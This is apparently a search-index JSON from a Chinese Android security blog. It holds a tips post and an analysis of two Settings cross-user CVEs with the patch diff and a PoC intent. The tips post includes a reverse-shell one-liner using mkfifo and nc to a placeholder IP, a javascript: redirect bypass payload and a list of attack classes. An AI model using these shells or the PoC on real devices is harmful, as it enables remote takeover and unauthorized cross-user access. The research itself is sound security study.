{"config":{"lang":["en","ja","zh"],"separator":"[\\s\\u200b\\-]","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u4e3b\u9875","text":"<p>Cloveiso\u200b\u7684\u200b\u5c0f\u200b\u535a\u5ba2\u200b</p>"},{"location":"site-message/","title":"\u7559\u8a00\u677f","text":"<p>\u200b\u6b22\u8fce\u200b\u4ea4\u53cb\u200b\u3002\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u90ae\u7bb1\u200b\u8054\u7cfb\u200b\uff0c\u200b\u6216\u8005\u200b\u79fb\u6b65\u200b\u5230\u200b \u201cGitHub Discussions\u201d \u200b\u5199\u4e0b\u200b\u5efa\u8bae\u200b\uff0c\u200b\u6216\u8005\u200b\u5411\u200b\u6211\u200b\u63d0\u95ee\u200b\uff0c\u200b\u5f53\u7136\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ea4\u4e2a\u200b\u670b\u53cb\u200b\u3002</p> <p>\u200b\u90ae\u7bb1\u200b\uff1a1258511864@qq.com</p>"},{"location":"blog/2024/11/Xiao-Zhi-Shi/","title":"\u5c0f\u200b\u77e5\u8bc6","text":"<p>1\u3001\u200b\u5e94\u7528\u200b\u5bf9\u5e94\u200b\u7684\u200buid  /data/system/packages.list</p> <p>2\u3001adb\u200b\u64cd\u4f5c\u200bprovider</p> <pre><code>content query --uri content://icc/adn \ncontent delete --uri content://settings/settings/pointer_speed\ncontent insert --uri content://settings/settings --bind name:s:my_number --bind value:i:2\n</code></pre> <p>3\u3001android \u200b\u53cd\u5f39\u200bshell</p> <pre><code>rm /data/local/tmp/f;mkfifo /data/local/tmp/f;cat /data/local/tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 2222 &gt;/data/local/tmp/f\nnc ip 2222|/bin/sh|nc ip 6666\n</code></pre> <p>4\u3001\u200b\u67e5\u770b\u200b\u8fdb\u7a0b\u200b\u72b6\u6001\u200b\u548c\u200buid\u200b\u72b6\u6001\u200b</p> <pre><code>dumpsys activity processes | grep UidRecord -C 2\n</code></pre> <p>5\u3001\u200b\u534f\u8bae\u200b\u7ed5\u8fc7\u200b</p> <p>javascript://www.baidu.com/%0D%0Awindow.location.href='http://ip/js_poc.html'</p> <p>6\u3001android\u200b\u6f0f\u6d1e\u200b\u603b\u7ed3\u200b</p> <pre><code>1\u3001activity\n\u200b\u8d8a\u6743\u200b\u7ed5\u8fc7\u200b\u3001\u200b\u9493\u9c7c\u200b\u6b3a\u8bc8\u200b/Activity\u200b\u52ab\u6301\u200b\u3001\u200b\u9690\u5f0f\u200b\u542f\u52a8\u200bIntent\u200b\u5305\u542b\u200b\u654f\u611f\u6570\u636e\u200b\u3001\u200b\u62d2\u7edd\u670d\u52a1\u200b\u653b\u51fb\u200b\u3001intent\u200b\u91cd\u5b9a\u5411\u200b\n2\u3001service\n\u200b\u6743\u9650\u200b\u63d0\u5347\u200b\u6f0f\u6d1e\u200b\u3001service\u200b\u52ab\u6301\u200b\u3001\u200b\u6d88\u606f\u200b\u4f2a\u9020\u200b\u3001\u200b\u62d2\u7edd\u670d\u52a1\u200b\u653b\u51fb\u200b\n3\u3001broadcast reciver\n\u200b\u654f\u611f\u200b\u4fe1\u606f\u200b\u6cc4\u6f0f\u200b\u6f0f\u6d1e\u200b\u3001\u200b\u6743\u9650\u200b\u7ed5\u8fc7\u200b\u6f0f\u6d1e\u200b\u3001\u200b\u6d88\u606f\u200b\u4f2a\u9020\u200b\u3001\u200b\u62d2\u7edd\u670d\u52a1\u200b\n4\u3001provider\n\u200b\u4fe1\u606f\u200b\u6cc4\u9732\u200b\u3001sql\u200b\u6ce8\u5165\u200b\u3001\u200b\u76ee\u5f55\u200b\u904d\u5386\u200b\n</code></pre> <p>7\u3001\u200b\u8c03\u7528\u200b\u7cfb\u7edf\u200b\u670d\u52a1\u200b</p> <pre><code>try {\n    val getServiceMethod = Class.forName(\"android.os.ServiceManager\").getMethod(\n        \"getService\",\n        String::class.java\n    )\n    val binder = getServiceMethod(null, \"companiondevice\") as IBinder\n    val clsStub = Class.forName(\"android.companion.ICompanionDeviceManager\\$Stub\")\n    val asInterfaceMethod = clsStub.getDeclaredMethod(\"asInterface\", IBinder::class.java)\n    val service = asInterfaceMethod(null, binder)\n    val clsProxy = Class.forName(\"IService\\$Stub\\$Proxy\")\n    val testMethod = clsProxy.getDeclaredMethod(\n        \"MethodName\", // change the method name\n        Float::class.java, Int::class.java, Long::class.java, Long::class.java // method args\n    )\n    testMethod(service, 10)\n} catch (e: Exception) {\n    e.printStackTrace()\n}\n</code></pre> <p>8\u3001\u200b\u67e5\u770b\u200b\u6743\u9650\u200b\u7b49\u7ea7\u200b</p> <pre><code>pm list permissions -f (\u200b\u7ecf\u5e38\u200b\u62a5\u9519\u200b)\ndumpsys package | grep -F \"Permission [android.permission.DEVICE_POWER]\" -C 3\n</code></pre>"},{"location":"blog/2024/11/Zu-Jian-Que-Shi-Xiao-Yan-Dao-Zhi-Kua-Yong-Hu-CVE-2023-21107-CVE-2024-43088/","title":"\u7ec4\u4ef6\u200b\u7f3a\u5931\u200b\u6821\u9a8c\u200b\u5bfc\u81f4\u200b\u8de8\u200b\u7528\u6237\u200bCVE-2023-21107&amp;CVE-2024-43088","text":"<p>\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u5173\u952e\u200b\u7cfb\u7edf\u200b\u5e94\u7528\u200b\uff0c\u200b\u7cfb\u7edf\u200b\u8bbe\u7f6e\u200b\u62e5\u6709\u200b\u8de8\u200b\u7528\u6237\u200b\u6743\u9650\u200b\uff0c\u200b\u6b64\u200b\u6f0f\u6d1e\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b Fragment \u200b\u63a5\u6536\u200b\u5916\u90e8\u200b\u4f20\u9012\u200b\u7684\u200b user handle \u200b\u800c\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u8f93\u5165\u200b\u6821\u9a8c\u200b\u548c\u200b\u6743\u9650\u200b\u68c0\u67e5\u200b\uff0c\u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u5f00\u59cb\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b user handle\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u4f7f\u5f97\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u4e00\u4e2a\u200b\u4f4e\u200b\u6743\u9650\u200b\u7684\u200b\u6076\u610f\u200b\u5e94\u7528\u200b\uff0c\u200b\u6253\u5f00\u200b Settings \u200b\u5e76\u200b\u4f20\u5165\u200b\u5176\u4ed6\u200b\u7528\u6237\u200b\u7684\u200b handle\uff0c\u200b\u8ba9\u200b\u9ad8\u200b\u6743\u9650\u200b\u7684\u200b Settings \u200b\u9519\u8bef\u200b\u8bbf\u95ee\u200b\u548c\u200b\u64cd\u4f5c\u200b\u5176\u4ed6\u200b\u7528\u6237\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>CVE-2023-21107\u200b\u6f0f\u6d1e\u8865\u4e01\u200b\uff1aEnforce INTERACT_ACROSS_USERS_FULL permission for NotificationAccessDetails</p> <p>CVE-2024-43088\u200b\u6f0f\u6d1e\u8865\u4e01\u200b\uff1aChecks cross user permission before handling intent</p>"},{"location":"blog/2024/11/Zu-Jian-Que-Shi-Xiao-Yan-Dao-Zhi-Kua-Yong-Hu-CVE-2023-21107-CVE-2024-43088/#cve-2024-43088","title":"CVE-2024-43088\u200b\u5206\u6790","text":"<p>\u200b\u4e24\u4e2a\u200b\u6f0f\u6d1e\u200b\u57fa\u672c\u200b\u4e00\u6a21\u4e00\u6837\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4ee5\u200bCVE-2024-43088\u200b\u4e3a\u4f8b\u200b\u6d45\u6d45\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b</p> <p>\u200b\u5148\u770b\u200b\u4e00\u4e0b\u200b\u8865\u4e01\u200b\uff1a</p> <pre><code>@@ -135,8 +137,13 @@\n             }\n         }\n         if (intent != null &amp;&amp; intent.hasExtra(Intent.EXTRA_USER_HANDLE)) {\n-            mUserId = ((UserHandle) intent.getParcelableExtra(\n-                    Intent.EXTRA_USER_HANDLE)).getIdentifier();\n+            mUserId = ((UserHandle) intent.getParcelableExtra(Intent.EXTRA_USER_HANDLE))\n+                    .getIdentifier();\n+            if (mUserId != UserHandle.myUserId() &amp;&amp; !hasInteractAcrossUsersPermission()) {\n+                Log.w(TAG, \"Intent not valid.\");\n+                finish();\n+                return \"\";\n+            }\n         } else {\n             mUserId = UserHandle.myUserId();\n         }\n@@ -159,6 +166,28 @@\n         return mPackageName;\n     }\n\n+    @VisibleForTesting\n+    protected boolean hasInteractAcrossUsersPermission() {\n+        Activity activity = getActivity();\n+        if (!(activity instanceof SettingsActivity)) {\n+            return false;\n+        }\n+        final String callingPackageName =\n+                ((SettingsActivity) activity).getInitialCallingPackage();\n+\n+        if (TextUtils.isEmpty(callingPackageName)) {\n+            Log.w(TAG, \"Not able to get calling package name for permission check\");\n+            return false;\n+        }\n+        if (mPm.checkPermission(Manifest.permission.INTERACT_ACROSS_USERS_FULL, callingPackageName)\n+                != PackageManager.PERMISSION_GRANTED) {\n+            Log.w(TAG, \"Package \" + callingPackageName + \" does not have required permission \"\n+                    + Manifest.permission.INTERACT_ACROSS_USERS_FULL);\n+            return false;\n+        }\n+        return true;\n+    }\n+\n</code></pre> <p>\u200b\u4e3b\u8981\u200b\u6dfb\u52a0\u200b\u4e86\u200bhasInteractAcrossUsersPermission\u3002\u200b\u5f53\u200buserID\u200b\u548c\u200b\u5f53\u524d\u200b\u7684\u200buserID\u200b\u4e0d\u200b\u540c\u65f6\u200b\u5c31\u200b\u4f1a\u200b\u8c03\u7528\u200bhasInteractAcrossUsersPermission\u200b\u51fd\u6570\u200b\u6765\u200b\u6821\u9a8c\u200b\u62c9\u8d77\u65b9\u200b\u662f\u5426\u200b\u6709\u200b\u8de8\u200b\u7528\u6237\u200b\u6743\u9650\u200b</p> <p>\u200b\u627e\u5230\u200b\u6f0f\u6d1e\u200b\u4f4d\u7f6e\u200b\uff1apublic abstract class AppInfoBase extends SettingsPreferenceFragment implements ApplicationsState.Callbacks\uff0c\u200b\u662f\u200b\u4e00\u4e2a\u200bfragment\uff0c\u200b\u5e76\u4e14\u200b\u662f\u200b\u4e00\u4e2a\u200b\u62bd\u8c61\u7c7b\u200b</p> <p></p> <p>\u200b\u67e5\u627e\u200b\u8be5\u200b\u51fd\u6570\u8c03\u7528\u200b\uff1a</p> <p></p> <p>\u200b\u4ee5\u200bcom.android.settings.applications.UsageAccessDetails\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200bcom.android.settings.Settings.AppUsageAccessSettingsActivity</p> <p></p> <p>\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u62c9\u8d77\u200b\u4ed6\u200b\u770b\u200b\u662f\u200b\u4ec0\u4e48\u6837\u200b\u7684\u200b</p> <pre><code>                Intent intent = new Intent();\n                intent.setClassName(\"com.android.settings\", \"com.android.settings.Settings$AppUsageAccessSettingsActivity\");\n                intent.setData(Uri.parse(\"com.android.chrome\"));\n                startActivity(intent);\n</code></pre> <p></p> <p>\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u5927\u6982\u200b\u5c31\u200b\u660e\u767d\u200b\u4e86\u200b\u3002\u200b\u5c31\u662f\u200b\u53ef\u4ee5\u200b\u8de8\u200b\u7528\u6237\u200b\u6388\u6743\u200b\u5457\u200b</p> <p>\u200b\u5148\u200b\u968f\u4fbf\u200b\u5199\u4e2a\u200b\u5e94\u7528\u200b\uff0c\u200b\u7533\u8bf7\u200b\u4e00\u4e0b\u200bandroid.permission.PACKAGE_USAGE_STATS\u200b\u6743\u9650\u200b\u5b89\u88c5\u200b\u5230\u200buser10</p> <p></p> <p></p> <p>\u200b\u73b0\u5728\u200b\u662f\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u72b6\u6001\u200b</p> <p></p> <p>\u200b\u7136\u540e\u200b\u6211\u4eec\u200b\u5207\u6362\u200b\u56de\u4e3b\u200b\u7528\u6237\u200b\u518d\u200b\u5199\u200b\u4e00\u4e2a\u200b\u5e94\u7528\u200b</p> <pre><code>Intent intent = new Intent();\nintent.setClassName(\"com.android.settings\", \"com.android.settings.Settings$AppUsageAccessSettingsActivity\");\nintent.setData(Uri.parse(\"com.android.test5\"));\nUserHandle us = UserHandle.getUserHandleForUid(1010000);\nLog.e(TAG, \"onClick: \" + us );\nintent.putExtra(\"android.intent.extra.user_handle\", us);\nstartActivity(intent);\n</code></pre> <p></p> <p>\u200b\u8fd0\u884c\u200bpoc\u200b\u4e4b\u540e\u200b\u662f\u200b\u8fd9\u200b\u6837\u5b50\u200b\u7684\u200b</p> <p></p> <p>\u200b\u6211\u4eec\u200b\u70b9\u51fb\u200b\u5141\u8bb8\u200b\u6309\u94ae\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u5207\u6362\u200b\u5230\u200buser10\uff0c\u200b\u8fd9\u65f6\u200b\u5df2\u7ecf\u200b\u53d8\u6210\u200b\u5df2\u200b\u5141\u8bb8\u200b\u4e86\u200b</p> <p></p>"},{"location":"blog/2024/11/Zu-Jian-Que-Shi-Xiao-Yan-Dao-Zhi-Kua-Yong-Hu-CVE-2023-21107-CVE-2024-43088/#_1","title":"\u6742\u9879","text":"<p>com.android.settings.applications.AppInfoBase\u200b\u7684\u200b\u5b50\u7c7b\u200b\u6709\u200b\u5f88\u591a\u200b\uff0c\u200b\u8be5\u200b\u95ee\u9898\u200b\u4ee3\u7801\u200b\u5728\u200bAppInfoBase\u200b\u7684\u200bonCreate\u200b\u51fd\u6570\u200b\u91cc\u200b\u5c31\u200b\u4f1a\u200b\u8c03\u7528\u200b\u3002\u200b\u6240\u4ee5\u200b\u6309\u7406\u200b\u6765\u8bf4\u200b\u4ed6\u200b\u7684\u200b\u6240\u6709\u200b\u5b50\u7c7b\u200b\u90fd\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u7684\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u5e76\u200b\u4e0d\u662f\u200b\u8fd9\u6837\u200b\u3002\u200b\u7531\u4e8e\u200bsettings\u200b\u7684\u200bfragment\u200b\u7684\u200b\u542f\u52a8\u200b\u9650\u5236\u200b\uff0c\u200b\u6709\u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b\u662f\u200b\u6ca1\u6cd5\u200b\u5229\u7528\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e00\u79cd\u200b\u662f\u200b\u53ea\u80fd\u200b\u7531\u200b\u70b9\u51fb\u200b\u8fdb\u5165\u200b\u7684\u200bfragment\uff0c\u200b\u4f8b\u5982\u200bcom.android.settings.applications.AppStorageSettings</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u662f\u200b\u5728\u200bFRAGMENT_TO_SPA_APP_DESTINATION_PREFIX_MAP\u200b\u8fd9\u4e2a\u200bmap\u200b\u91cc\u200b\u7684\u200b</p> <p>\u200b\u56e0\u4e3a\u200b\u5728\u200b\u8fd9\u200b\u4e24\u4e2a\u200bmap\u200b\u91cc\u200b\u7684\u200bfragment\u200b\u4f1a\u200b\u8c03\u7528\u200bcom.android.settings.spa.SpaActivity$Companion.startSpaActivityForApp\u200b\u51fd\u6570\u200b</p> <p></p> <p>startSpaActivityForApp\u200b\u51fd\u6570\u200b\u4f1a\u200b\u4ece\u200bintent\u200b\u4e2d\u200b\u83b7\u53d6\u200b\u5305\u540d\u200b\u3002\u200b\u7136\u540e\u200b\u672b\u5c3e\u200b\u52a0\u4e0a\u200b\u5f53\u524d\u200b\u7684\u200buserID\uff0c\u200b\u5bfc\u81f4\u200b\u65e0\u6cd5\u200b\u5229\u7528\u200b</p> <p></p> <p>\u200b\u90a3\u4e48\u200b\u8fd8\u6709\u200b\u54ea\u4e9b\u200bfragment\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u5462\u200b\uff0c\u200b\u6211\u200b\u4ed4\u7ec6\u200b\u8fc7\u6ee4\u200b\u4e86\u200b\u4e00\u904d\u200b\uff1a</p> <p>\u200b\u7136\u540e\u200b\u53ea\u200b\u53d1\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b0.0</p> <p>com.android.settings.applications.appinfo.LongBackgroundTasksDetails</p> <p></p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/archive/2024/","title":"2024","text":""},{"location":"blog/category/cve%E5%88%86%E6%9E%90/","title":"CVE\u200b\u5206\u6790","text":""}]}